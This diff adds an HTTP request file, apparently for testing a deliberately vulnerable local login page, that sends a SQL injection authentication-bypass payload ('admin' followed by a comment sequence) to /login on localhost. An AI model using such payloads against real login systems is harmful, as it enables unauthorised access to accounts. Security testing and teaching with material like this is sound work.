@@ -1,0 +1,11 @@
+### Authentication Bypass Request (Burp Suite / REST Client format)
+POST /login HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 48
+Origin: http://localhost:8080
+Referer: http://localhost:8080/login.jsp
+Connection: keep-alive
+
+username=admin%27+--+&password=dummy&mode=vulnerable
